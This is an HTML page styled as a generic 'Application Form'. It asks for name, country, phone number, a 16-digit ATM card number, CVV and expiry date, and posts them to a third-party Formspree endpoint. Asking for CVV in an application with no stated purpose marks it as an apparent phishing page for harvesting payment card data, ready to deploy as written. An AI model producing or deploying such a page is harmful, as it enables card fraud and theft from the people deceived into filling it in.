<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #f2f2f2;
    }
    form {
      background: white;
      padding: 20px;
      border-radius: 10px;
      max-width: 500px;
      margin: auto;
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input[type="text"],
    input[type="tel"],
    input[type="number"],
    input[type="month"] {
      width: 100%;
      padding: 8px;
      box-sizing: border-box;
      margin-top: 5px;
    }
    input:invalid {
      border: 1px solid red;
    }
    .error-message {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    input:invalid + .error-message {
      display: block;
    }
    button {
      margin-top: 20px;
      padding: 10px 20px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background: #45a049;
    }
  </style>
</head>
<body>
  <form action="https://formspree.io/f/your-form-id" method="POST" novalidate>
    <h2>Application Form</h2>

    <label for="fullname">Full Name:</label>
    <input type="text" name="Full Name" id="fullname" required placeholder="Enter your full name" />
    <div class="error-message">Please enter your full name.</div>

    <label for="country">Country:</label>
    <input type="text" name="Country" id="country" required placeholder="Enter your country" />
    <div class="error-message">Please enter your country.</div>

    <label for="phone">Phone Number:</label>
    <input 
      type="tel" 
      name="Phone Number" 
      id="phone" 
      required 
      pattern="[0-9]{9,12}" 
      placeholder="Enter phone number (9â€“12 digits)" 
    />
    <div class="error-message">Phone number must be 9 to 12 digits.</div>

    <label for="card">ATM Card Number:</label>
    <input 
      type="text" 
      name="ATM Card Number" 
      id="card" 
      required 
      pattern="\d{16}" 
      placeholder="Enter 16-digit card number" 
    />
    <div class="error-message">Card number must be 16 digits.</div>

    <label for="cvv">CVV:</label>
    <input 
      type="text" 
      name="CVV" 
      id="cvv" 
      required 
      pattern="\d{3}" 
      placeholder="Enter 3-digit CVV" 
    />
    <div class="error-message">CVV must be 3 digits.</div>

    <label for="expiry">Expiry Date:</label>
    <input 
      type="month" 
      name="Expiry Date" 
      id="expiry" 
      required 
    />
    <div class="error-message">Please enter the expiry date.</div>

    <button type="submit">Submit</button>
  </form>
</body>
</html>
